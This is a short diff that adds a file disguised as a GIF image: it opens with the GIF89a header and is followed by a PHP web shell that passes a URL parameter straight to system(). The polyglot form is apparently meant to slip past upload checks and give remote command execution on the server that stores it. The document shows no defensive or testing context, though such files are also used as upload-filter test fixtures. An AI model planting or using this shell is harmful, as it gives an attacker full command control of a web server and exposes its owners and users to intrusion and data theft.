@@ -1,0 +1,2 @@
+GIF89a
+<?php echo "---SHELL START---"; system($_GET[1]); ?>
